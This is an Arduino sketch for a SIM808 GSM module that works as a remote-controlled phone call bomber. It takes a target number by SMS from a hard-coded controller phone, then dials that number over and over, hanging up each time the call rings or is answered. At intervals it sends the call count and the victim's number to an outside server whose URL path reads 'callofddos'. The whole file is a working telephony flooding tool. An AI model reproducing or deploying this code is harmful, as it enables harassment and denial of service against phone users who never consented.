#include <DFRobot_sim808.h>
#include <SoftwareSerial.h>
#define BINK2 11
#define BINK1 10
#define MESSAGE_LENGTH 160
char message[MESSAGE_LENGTH];
int messageIndex = 0;
char phone[16];
char datetime[24];
String bt = "+CLCC: 1,0,3";
String jt = ",129,\"\",0,\"";
String gd = "+CLCC: 1,0,6";
String myphone = "";
String mymsg = "";
int successful50 = 0;
int zt = 0;
int hjzt = 0;
DFRobot_SIM808 sim808(&Serial);

void setup()
{
  Serial.begin(9600);//设置波特率

  while (!sim808.init())
  {
    Serial.print("die!die!die!\r\n");
    delay(1000);
  }
  delay(3000);
  Serial.println("Heros never die!");
  delay(1000);
  Serial.println("AT+COLP=1");  //回显状态
  Serial.println("AT+CLCC=1");  //回显状态
}
void(* resetFunc) (void) = 0;//复位
void loop()
{
  getmsg();
  myphone = phone;
  if (myphone == "18888888888") { //你的手机号 用来控制设备
    mymsg = message;
    myphone = "";
    memset(phone, 0, 16);
  }
  if (mymsg.length() == 11) {
    Serial.println(successful50);
    Serial.println("\n (~o~)Fire!!!");
    Ring();
    //Serial.println("Ring......");
    while (Serial.read() >= 0) {} //清空缓存
  } else {
    Serial.println(" (-.-) No target");
  }

}
void getmsg() {
  messageIndex = sim808.isSMSunread();
  Serial.println(messageIndex);
  if (messageIndex > 0) {
    sim808.readSMS(messageIndex, message, MESSAGE_LENGTH, phone, datetime);//获取短信内容 phone message datetime
    sim808.deleteSMS(messageIndex);//删除短信内容
  }
}
void Ring()
{
  zt = 0; //处理次数计数器
  successful50 = successful50 + 1;
  if (successful50 % 50 == 0) {
    //    String lsmymsg=mymsg;  //每呼叫50次后就呼叫你的手机一次
    //    mymsg="18888888888";
    //    Ring();
    //    mymsg=lsmymsg;
    hjzt = 1;
    httpget();
  }
  Serial.print("ATD" + mymsg + ";\r\n"); //拨号
  while (zt <= 10) {
    zt = zt + 1; //处理次数计数器，如果超过十次则退出循环，继续拨号。（整判断过程为1秒左右）
    String readstr = Serial.readString();  //把窗口缓存读到字符串
    int judgebt = readstr.indexOf(bt);  //拨通状态   readstr.indexOf 寻找指定字符串，并且分割。如果没有则值为-1
    int judgejt = readstr.indexOf(jt);  //接通状态
    int judgegd = readstr.indexOf(gd);  //被挂断状态
    //---如果存在设定的状态，则挂断直接退出循环。-------
    if (judgebt != -1) {
      delay(2000);
      HangUp();
      break;
    } else if (judgejt != -1) {
      HangUp();
      break;
    } else if (judgegd != -1) {
      HangUp();
      break;
    } else {  //都没有找到则闪烁灯
      digitalWrite(BINK2, HIGH);
      delay(200);
      digitalWrite(BINK2, LOW);
    }
    if (zt >= 10) {
      hjzt = 0;
      httpget();
      resetFunc();
    }
  }
}

void HangUp() //挂断
{
  Serial.print("ATH\r\n");
}
void httpget()
{
  Serial.println("ATH");
  delay(2000);
  Serial.println("AT+SAPBR=3,1,\"CONTYPR\",\"GPRS\"");
  delay(2000);
  Serial.println("AT+SAPBR=3,1,\"APN\",\"CMNET\"");
  delay(2000);
  Serial.println("AT+SAPBR=1,1");
  delay(2000);
  Serial.println("AT+HTTPINIT");
  delay(3000);
  Serial.print("AT+HTTPPARA=\"URL\",\"http://wh0.me/tools/callofddos/gprs.php?cs=");
  delay(500);
  Serial.print(successful50);
  delay(500);
  Serial.print("&hm=");
  delay(500);
  Serial.print(mymsg);
  delay(500);
  Serial.print("&zt=");
  Serial.print(hjzt);
  Serial.println("&pass=123123123i\"");
  delay(2000);
  Serial.println("AT+HTTPACTION=0");
  delay(2000);
  Serial.println("AT_HTTPTERM");
  delay(6000);
}
